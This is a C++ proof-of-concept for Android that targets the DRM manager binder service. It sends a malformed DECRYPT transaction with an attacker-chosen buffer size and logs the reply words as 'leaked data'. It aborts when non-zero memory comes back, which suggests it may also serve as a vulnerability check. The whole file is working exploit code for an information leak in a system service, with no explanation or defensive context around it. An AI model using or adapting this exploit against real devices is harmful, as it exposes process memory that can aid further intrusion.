#include <binder/Parcel.h>

#include <binder/ProcessState.h>

#include <binder/IServiceManager.h>

#include <soundtrigger/ISoundTriggerHwService.h>

#include <binder/TextOutput.h>

#include <media/IAudioFlinger.h>
#include <media/ICrypto.h>
#include <system/sound_trigger.h>
#include <gui/ISurfaceComposer.h>
#include <media/IMediaPlayer.h>
#include <media/IMediaPlayerService.h>
#include <media/IMediaPlayerClient.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <media/IOMX.h>
#include <android/log.h>
#include <drm/DrmInfo.h>
#include <drm/DrmConstraints.h>
#include <drm/DrmMetadata.h>
#include <drm/DrmRights.h>
#include <drm/DrmInfoStatus.h>
#include <drm/DrmConvertedStatus.h>
#include <drm/DrmInfoRequest.h>
#include <drm/DrmSupportInfo.h>

#include "IDrmManagerService.h"
using namespace android;
int INFO_LEAK_BUFFER_SIZE = 256;
int main(__attribute__((unused)) int argc, __attribute__((unused)) char*
const argv[])

{

   sp<IServiceManager> sm = defaultServiceManager();
   sp<IBinder> drmManagerService = sm->checkService(String16("drm.drmManager"));
   if (argc == 2) {
       INFO_LEAK_BUFFER_SIZE = atoi(argv[1]);
   }
   sp<IDrmManagerService> iDrmManager = IDrmManagerService::asInterface(drmManagerService);
   printf("Get iDrmManager instance, 0x%08x\n", iDrmManager.get());
   bool needAbort = false;
   for (int j = 0; j < 3; ++j) {
       //__android_log_print(ANDROID_LOG_INFO, "IAudioFlinger_InfoLeak", "The %dth round read", j + 1);
       Parcel data, reply;
       status_t err;
       //printf("Call IAudioFlinger CREATE_EFFECT\n");
       data.writeInterfaceToken(iDrmManager->getInterfaceDescriptor());
       data.writeInt32(0);
       /*handle->decryptId = */data.writeInt32(-1);
       /*handle->mimeType = */data.writeString8(String8("ddd"));
       /*handle->decryptApiType = */data.writeInt32(-1);
       /*handle->status = */data.writeInt32(-1);
       /*int size = */data.writeInt32(0);
       /*size = */data.writeInt32(0);
       /*const int bufferLen = */data.writeInt32(0);
       /*const int decryptUnitId = */data.writeInt32(-1);
       /*const int decBufferSize = */data.writeInt32(INFO_LEAK_BUFFER_SIZE);
       /*const int encBufferSize = */data.writeInt32(0);
       iDrmManager->asBinder()->transact(30, data, &reply); // 30 is DECRYPT
       err = reply.readInt32();
 
       printf("iDrmManager 30 err is %d\n", err);
       if (err == NO_ERROR) {
           continue;
       }
       int data_size = reply.readInt32();
       printf("data aval %d\n", reply.dataAvail());
       int dataAvail = reply.dataAvail();
       unsigned char* out = new unsigned char[dataAvail];
       memset(out, 0, dataAvail);
       reply.read(out, dataAvail);
       unsigned int* outInt = (unsigned int*)out;
       int size = dataAvail / 4;
       for (int i = 0; i < size; ++i) {
           if (outInt[i] != 0) {
               needAbort = true;
           }
           __android_log_print(ANDROID_LOG_INFO, "IDrmManager_InfoLeak", "leaked data = 0x%08x", outInt[i]);
       }
       
       delete [] out;
       //printf("\nRead over\n");
   }
   if (needAbort) {
       abort();
   }
   return 0;
}
